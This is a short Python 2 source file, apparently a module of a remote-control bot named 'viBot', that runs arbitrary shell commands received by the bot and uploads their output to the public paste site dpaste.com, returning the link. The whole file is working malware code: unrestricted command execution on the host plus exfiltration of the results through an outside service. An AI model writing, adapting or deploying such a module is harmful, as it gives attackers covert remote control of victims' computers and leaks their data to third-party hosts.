#!/usr/bin/env python2
#-*- coding: utf-8 -*-
#
#

""" Execute OS commands - viBot Project module """

__author__ = "Black Viking"

import os
import urllib
import urllib2
import subprocess

usage = "[?] Execute module usage: execute COMMAND"

def post(content):
	data = urllib.urlencode({"content": content, "expiry_days": 365})
	req  = urllib2.Request("http://dpaste.com", data=data)
	
	return urllib2.urlopen(req).url + ".txt"

def run(command):
	global result

	if command[:2] == "cd":
		try:
			os.chdir(command[3:])
		except Exception as err:
			result = err.strerror
	
	elif command == "pwd":
		result = os.getcwd()

	else:
		process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		result  = process.stdout.read() + process.stderr.read()
		
		if result == "": result = " "

	return post(result)
